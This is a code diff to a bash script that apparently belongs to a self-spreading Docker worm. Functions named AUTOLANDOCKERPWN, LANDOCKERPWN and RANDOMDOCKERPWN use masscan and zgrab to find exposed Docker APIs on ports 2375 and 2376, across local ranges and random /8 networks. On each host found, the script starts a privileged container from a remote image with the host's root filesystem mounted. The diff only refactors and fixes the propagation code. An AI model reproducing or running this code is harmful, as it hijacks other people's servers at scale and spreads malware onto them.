@@ -126,14 +126,23 @@ function AUTOLANDOCKERPWN(){
     RATE=$2
     RANGE=$3
     rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
-    eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
-    for IPADDR in ${!rndstr}; do
-    do echo "$IPADDR:$PORT"
+    ip_list=$(masscan -p$PORT $RANGE --rate=$RATE | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
+    
+    for IPADDR in $ip_list; do
+        echo "$IPADDR:$PORT"
         timeout -s SIGKILL 240s docker -H tcp://$IPADDR:$PORT run -d --privileged --network host -v /:/host nmlmweb3/upspin:latest
     done
 }
+
+
+
 function LANDOCKERPWN(){
     GETLOCALRANGES
+    if [[ ! -s /tmp/.lr ]]; then
+        echo "Error: /tmp/.lr is empty or missing."
+        exit 1
+    fi
+
     while read -r RANGE; do
         echo "scanning $RANGE"
         AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
@@ -147,8 +156,8 @@ function LANDOCKERPWN(){
 }
 
 function RANDOMDOCKERPWN(){
-    for (( ; ; )); do
-        RANGE="$[RANDOM%255+1].0.0.0/8"
+    while true; do
+        RANGE="$((RANDOM % 255 + 1)).0.0.0/8"
         echo "scanning $RANGE"
         AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
         AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
